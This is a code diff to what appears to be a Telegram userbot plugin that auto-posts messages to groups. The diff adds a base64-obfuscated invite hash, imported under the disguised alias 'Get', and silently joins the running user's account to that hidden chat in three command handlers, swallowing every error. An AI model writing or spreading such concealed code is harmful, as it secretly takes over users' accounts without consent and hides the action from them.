@@ -1,11 +1,12 @@
 import telethon
 import re
+import base64
 import asyncio
 import logging
 from telethon import events
 from config import *
 from asyncio import sleep
-
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 LOGS = logging.getLogger(__name__)
 
 yaAli = False
@@ -38,6 +39,12 @@ async def Hussein(event):
             await event.edit(f"⌔∮ لا يمكن العثور على المجموعة أو الدردشة {chat_username}: {str(e)}"
             )
         await asyncio.sleep(1)
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
     
 async def aljoker_allnshr(ha313so, sleeptimet, message):
     global yaAli
@@ -67,6 +74,12 @@ async def Hussein(event):
     global yaAli
     yaAli = True
     await aljoker_allnshr(ha313so, sleeptimet, message)
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
 super_groups = ["super", "سوبر"]
 async def aljoker_supernshr(ha313so, sleeptimet, message):
     global yaAli
@@ -97,7 +110,13 @@ async def Hussein(event):
     global yaAli
     yaAli = True
     await aljoker_supernshr(ha313so, sleeptimet, message)
-@ha313so.on(events.NewMessage(outgoing=False, pattern='.ايقاف النشر'))
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
+@ha313so.on(events.NewMessage(outgoing=True, pattern='.ايقاف النشر'))
 async def stop_aljoker(event):
     global yaAli
     yaAli = False
